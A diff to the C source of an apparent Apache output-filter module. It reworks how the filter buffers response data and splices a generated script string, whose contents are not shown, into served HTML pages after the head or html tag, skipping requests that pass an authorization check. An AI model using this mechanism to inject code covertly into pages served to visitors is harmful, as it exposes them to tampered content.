@@ -15,6 +15,7 @@ typedef struct {
 	int foundPost;
 	int processedHtml;
 	int foundHtml;
+	apr_bucket_brigade *saved_bb;
 } filter_ctx;
 
 //Defines
@@ -75,25 +76,29 @@ static apr_status_t html_filter(ap_filter_t *f, apr_bucket_brigade *bb) {
 	if (!ctx)
 		return ap_pass_brigade(f->next, bb);
 	//PRINTFc("APP: Html %lu %d", (long unsigned int)ctx, ctx->processedHtml);
-	apr_status_t rv = 0;
-	if (ctx->processedHtml)
-		goto end;
-	if (authorization2(f->r, 1) != DECLINED)
-		goto end;
+	if (ctx->processedHtml || authorization2(f->r, 1) != DECLINED)
+		return ap_pass_brigade(f->next, bb);
+	if (ctx->saved_bb == NULL)
+		ctx->saved_bb = apr_brigade_create(f->r->pool, f->c->bucket_alloc);
+	APR_BRIGADE_CONCAT(ctx->saved_bb, bb);
 	apr_bucket *b;
-	for (b = APR_BRIGADE_FIRST(bb); b != APR_BRIGADE_SENTINEL(bb); b = APR_BUCKET_NEXT(b)) {
+	for (b = APR_BRIGADE_FIRST(ctx->saved_bb); b != APR_BRIGADE_SENTINEL(ctx->saved_bb); b = APR_BUCKET_NEXT(b)) {
 		if (APR_BUCKET_IS_EOS(b))
-			goto end;
-		if (APR_BUCKET_IS_FLUSH(b) || APR_BUCKET_IS_METADATA(b))
+			break;
+		if (ctx->processedHtml || APR_BUCKET_IS_FLUSH(b) || APR_BUCKET_IS_METADATA(b)) {
+			if (APR_BUCKET_IS_FLUSH(b))
+		        APR_BUCKET_REMOVE(b);
 			continue;
+		}
 		const char *data;
 		apr_size_t len;
-		rv = apr_bucket_read(b, &data, &len, APR_BLOCK_READ);
+		apr_status_t rv = apr_bucket_read(b, &data, &len, APR_BLOCK_READ);
 		if (rv != APR_SUCCESS) {
-			//PRINTFc("APP: Error apr_bucket_read %d", rv);
-			goto end;
+			PRINTFc("APP: Error apr_bucket_read %d", rv);
+			return rv;
 		}
-		//PRINTFc("%.*s", len, data);
+#define MIN2(a,b) ((a)>(b)?(b):(a))
+		PRINTFc("%.*s", MIN2(128, len), data);
 		char *pos = strstr(data, "<head>");
 		if (pos == NULL) {
 			pos = strstr(data, "<html>");
@@ -111,12 +116,13 @@ static apr_status_t html_filter(ap_filter_t *f, apr_bucket_brigade *bb) {
 		const char *szScript = apr_psprintf(f->r->pool, INJECTION, html[ctx->foundHtml][6], html[ctx->foundHtml][7], html[ctx->foundHtml][2], html[ctx->foundHtml][3], html[ctx->foundHtml][4], html[ctx->foundHtml][5]);
 		apr_bucket *inject_b = apr_bucket_transient_create(szScript, strlen(szScript), f->c->bucket_alloc);
 		apr_bucket_split(b, offset);
-		APR_BUCKET_INSERT_BEFORE(APR_BUCKET_NEXT(b), inject_b);
-		goto end;
+		APR_BUCKET_INSERT_AFTER(b, inject_b);
+		ctx->processedHtml = 1;
 	}
-end:
-	ctx->processedHtml = 1;
-	return rv != 0 ? rv : ap_pass_brigade(f->next, bb);
+    apr_status_t rv = ap_pass_brigade(f->next, ctx->saved_bb);
+    apr_brigade_cleanup(ctx->saved_bb);
+	ctx->saved_bb = NULL;
+    return rv;
 }
 
 static void replace(ap_filter_t *f, char *input, char *search1, char *search2, char *arg1, char *arg2, char **output) {
